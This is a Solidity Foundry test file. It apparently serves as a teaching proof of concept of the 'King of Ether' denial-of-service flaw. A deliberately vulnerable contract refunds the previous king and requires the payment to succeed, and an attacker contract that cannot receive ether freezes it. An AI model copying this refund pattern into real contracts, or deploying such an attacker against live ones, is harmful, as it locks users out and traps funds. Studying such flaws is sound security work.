// SPDX-License-Identifier: MIT

import "forge-std/Test.sol";
import "forge-std/console.sol";

pragma solidity 0.8.19;

contract EtherKing{
    uint balance;
    address king;
    function changeKing() public  payable {
        console.log(balance);
     require(balance<msg.value,"val is not good");
     (bool sent, )=king.call{value: balance}("");
     require(sent,"did not send");
     balance=msg.value;
     king=msg.sender;
    }
}
contract Attack{
EtherKing etherKing;

constructor(EtherKing _etherKing){
    etherKing=_etherKing;
}
function attack() public payable{
   etherKing.changeKing{value: msg.value}();
}


}

contract contractTest is Test{
EtherKing etherKing;
Attack attack;

constructor(){
    etherKing=new EtherKing();
    attack=new Attack(etherKing);
}

function test_attack() public{
 address alice=vm.addr(1);
 address bob=vm.addr(2);
 vm.deal(alice, 4);
 vm.deal(bob, 2);
 vm.prank(alice);
 etherKing.changeKing{value:1}();

vm.prank(bob);
 etherKing.changeKing{value:2}();
console.log("alice",address(alice).balance);
 attack.attack{value:3}();
 console.log("bob",address(bob).balance);

  vm.prank(alice);
  vm.expectRevert();
 etherKing.changeKing{value:4}();
}



}